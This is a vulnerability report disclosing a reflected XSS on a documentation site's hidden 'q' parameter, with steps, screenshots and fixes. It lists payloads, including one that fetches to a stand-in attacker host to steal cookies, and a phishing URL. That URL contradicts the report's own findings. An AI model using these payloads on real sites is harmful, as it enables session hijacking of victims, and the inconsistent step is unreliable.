## Title
Unauthenticated Reflected XSS via Hidden q Parameter Bypasses Case-Sensitive Filter Allows Arbitrary JavaScript Execution

## OWASP - Vulnerability
OWASP Top 10 2025 - A05 Injection

## Description
An unauthenticated Reflected Cross-Site Scripting (`XSS`) vulnerability exists in the website's documentation search functionality. A hidden `q` parameter, discovered through parameter enumeration, reflects user input into the HTTP response without context-aware output encoding. The existing `<script>` filter is case-sensitive, so a mixed-case `<ScriPt>` tag bypasses it and executes arbitrary JavaScript in a victim's browser.


## Vulnerable Endpoint
`https://docs.pwnedbox.site/?q=`

## Payload Used
```
  cybrnoob'"<><ScriPt>alert(document.location)</ScriPt>
  cybrnoob'"<><ScriPt>cosole.error(document.location)</ScriPt>
  cybrnoob'"<><ScriPt>fetch('https://attacker.tld/steal?c='+document.cookie)</ScriPt>
```
## POC / Steps to Reproduce
1. Upon interacting with textboxes at `https://docs.pwnedbox.site/` it can be observed that the `js` payload is not reflected in the source code.
    <img width="756" height="491" alt="SCR-20261123-mhpk" src="https://github.com/user-attachments/assets/3d3695dc-49e7-45e9-a781-cebe17b50dbe" />
    <img width="756" height="491" alt="SCR-20261123-miok" src="https://github.com/user-attachments/assets/fca2b4f6-5baf-4a60-a0cd-933459f87dab" />
2. Using `x8scan` check for other parameters which may not be readily accessible for an expanded attack surface.
    <img width="629" height="207" alt="Screenshot 2026-11-23 at 1 25 53 AM" src="https://github.com/user-attachments/assets/eecc9e22-d7e1-4d8d-8ed0-a3e607599924" />
  - Here we identified 3 parameters, `fname`, `lname` and `q`.
3. For the parameters found, check via automation to see if a reflected url path exists.
  - Here we find the the hidden parameter `?q=` is reflected.
    <img width="516" height="619" alt="Screenshot 2026-11-23 at 1 26 15 AM" src="https://github.com/user-attachments/assets/0789f2c1-ab30-4030-a268-c3775342a3d1" />
4. Inject the javascript in the URL to see if it is executed.
   - Here it can be seen that the `<script>` tag is being filtered.
    <img width="756" height="491" alt="SCR-20261123-mnwz" src="https://github.com/user-attachments/assets/82a8fb41-4bea-47e8-80dd-d1ba1d70d11a" />
5. Verify whether filtering mechanism is case agnostic with a combination of uppercase and lowercase version of the tag.
    - For example:
      ```
      <Script>
      <ScriPt>
      ...
      ```
  - Note: `alert(), confirm(), prompt(), console.log(), console.error(), fetch()` all generate valid responses.
     - Here it can be seen that the injected payload executes seamlessly.
      <img width="756" height="491" alt="SCR-20261123-fejr" src="https://github.com/user-attachments/assets/83dacd2f-9db9-411a-a063-3c2860173f61" />
      <img width="756" height="491" alt="SCR-20261123-fegc" src="https://github.com/user-attachments/assets/3396d9b9-dd98-4576-8223-698c250ff448" />
6. Craft a weaponized URL (e.g., `https://docs.pwnedbox.site/?fname=&lname=<script>fetch('https://attacker.tld/steal?c='+document.cookie)</script>`) and deliver it to a victim via phishing, malicious link, or social engineering; upon opening the link, the payload executes in the victim's browser origin without any user interaction beyond clicking the link.

## Impact / Risk
1. An attacker can steal session cookies and impersonate the victim.
2. Malicious script can display fake login forms and steal credentials.
3. The script can redirect users, alter page content, or perform actions on their behalf.

## Recommendation
1. Never trust any user input. Treat parameter `q` as untrusted even if it is hidden.
2. Sanitize the input and remove HTML tags server-side instead of relying on a case-sensitive blocklist.
3. Apply context-aware HTML encoding on output so reflected input is rendered as text and never as executable markup.
4. Use a vetted encoding library, add a restrictive Content Security Policy, and set HttpOnly and SameSite on session cookies as defense in depth.
